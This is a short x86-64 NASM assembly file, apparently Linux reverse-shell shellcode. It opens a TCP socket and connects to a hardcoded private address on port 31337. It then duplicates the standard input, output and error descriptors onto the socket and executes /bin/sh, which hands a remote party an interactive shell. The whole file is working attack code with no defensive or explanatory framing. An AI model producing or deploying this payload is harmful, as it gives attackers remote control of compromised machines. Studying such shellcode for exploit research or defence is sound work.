BITS 64
; s = socket(2, 1, 0)
; int socket(int domain, int type, int protocol);

  push BYTE 0x29    ; sys_socket #41 (0x29)
  pop rax
  cqo               ; zero out rdx for use as a null QWORD later
  xor rdi, rdi      
  inc rdi           
  inc rdi 
  xor rsi, rsi
  inc rsi
  syscall

  xchg rdi, rax

  ;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
  push BYTE 0x2a
  pop rax
  push rdx
  mov DWORD [rsp+0x4], 0x690a0a0a
  mov WORD [rsp+0x2],0x697a
  mov BYTE [rsp],0x2
  mov rsi, rsp
  push 0x10
  pop rdx
  syscall

  ; dup2(connected socket, {all three standard I/O file descriptors})
  ; int dup2(int oldfd, int newfd);
  xchg rdi, rax      ; move socket FD in rdi
  xor rax, rax
  push byte 0x2
  pop rsi
dup_loop:
  mov BYTE al, 0x21    ; dup2  syscall #33
  syscall
  dec rsi
  jns dup_loop

; execve(const char *filename, char *const argv [], char *const envp[])
  xor rax, rax
  push rax
  mov r8, 0x68732f2f6e69622f
  push r8
  mov rdi, rsp
  push rax
  mov rdx, rsp
  push rdi
  mov rsi, rsp
  mov al, 0x3b
  syscall